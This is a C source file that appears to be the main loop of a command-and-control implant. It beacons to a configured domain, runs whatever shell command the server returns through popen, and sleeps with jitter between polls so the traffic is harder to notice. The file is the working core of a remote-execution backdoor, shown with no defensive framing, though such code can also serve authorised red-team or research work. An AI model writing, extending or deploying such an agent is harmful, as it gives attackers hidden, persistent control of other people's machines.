#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#include "lib/options.h"
#include "lib/client.h"
#include "lib/utils.h"

#include "lib/debug.h"

int main()
{
    srand(time(NULL));

    struct Client *client = init_client();
    Dprintf("[d] booting agent for %s\n", client->domain);

    while (1)
    {
        poll(client);

        switch (client->status)
        {
        case Idle:
            // do nothing, we're idle
            break;

        case Command:
            Dprintf("[d] we have the '%s' command to execute!\n", client->command);
            popen(client->command, "r");
            break;

        case Error:
            Dprintf("[de] the server indicated an error occured, resetting");
            client->status = Idle;
            break;

        default:
            Dprintf("[de] something is wrong, client reached an unknown status");
            break;
        }

        Dprintf("[d] client status is: %d\n", client->status);
        jittered_sleep();
    }

    return 0;
}
